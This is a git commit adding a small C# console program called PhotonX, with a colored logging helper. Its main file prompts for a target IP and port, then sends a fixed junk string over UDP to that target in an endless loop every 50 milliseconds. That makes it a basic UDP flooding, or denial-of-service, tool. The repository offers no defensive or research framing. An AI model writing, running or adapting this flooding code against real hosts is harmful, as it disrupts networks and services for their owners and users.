8c042931a4938bfb45cf4243095a5af145f2aa96
Sutinder Saini <sutinder456@gmail.com>
2021-02-08 11:35:34 -0800

    Add project files.

---
+++ PhotonX/Core.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Sockets;
+using PhotonX;
+using System.Net;
+using System.Threading;
+
+namespace PhotonX
+{
+    class Core
+    {
+        static void Main(string[] args)
+        {
+            _Log log = new _Log();
+            log.logF<string>("To continue, you must provide the target IP.", false);
+            string ip_prompt = Console.ReadLine();
+
+            if(ip_prompt == null)
+            {
+                log.logF<string>("No ip was entered, exiting...", true);
+            } else
+            {
+                log.logF<string>("Enter the target port", false);
+                string port_prompt = Console.ReadLine();
+
+                if (port_prompt == null) { return; }
+                else
+                {
+                    try
+                    {
+                        var conv = Convert.ToInt32(port_prompt);
+                        log.logF<string>($"Starting up PhotonX on: {ip_prompt}:{conv}", false);
+                        log.logF<string>($"Creating socket...", false);
+                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+                        IPAddress addr = Dns.Resolve(ip_prompt).AddressList[0];
+                        log.logF<string>($"[[ {addr} ]]", true);
+                        IPEndPoint target = new IPEndPoint(addr, conv);
+                        string data = "{}!@#$%^&*()";
+                        byte[] buff = Encoding.ASCII.GetBytes(data);
+                        while (true)
+                        {
+                            socket.SendTo(buff, target);
+                            log.logF<string>($"sent: {data} to: {target}", true);
+                            Thread.Sleep(50);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        log.logF<string>($"--> {ex}", true);
+                        Console.ReadKey();
+                    }
+
+                }
+            }
+
+        }
+    }
+}
---
+++ PhotonX/Log.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+
+namespace PhotonX
+{
+    class _Log
+    {
+
+        private int hours, minutes, seconds;
+        public static _Log l = new _Log();
+
+        /// <summary>
+        /// The logF function writes the given T parameter to the terminal.
+        /// 
+        /// It would be helpful to note that, when the log is critical the text color
+        /// displayed on the terminal will be red. If it isn't, the text color is set to yellow.
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="content"></param>
+        public void logF<T>(T content, bool is_critical)
+        {
+            // fetch current time.
+            hours = DateTime.UtcNow.Hour;
+            minutes = DateTime.UtcNow.Minute;
+            seconds = DateTime.UtcNow.Second;
+            string timeFmt = $"{hours}:{minutes}:{seconds}";
+
+            if(is_critical)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write($"\n[{timeFmt}] (CRITICAL) LOG: {content}       ~~~");
+                return;
+            }
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.Write($"\n[{timeFmt}] LOG: {content} : ");
+        }
+
+
+    }
+}
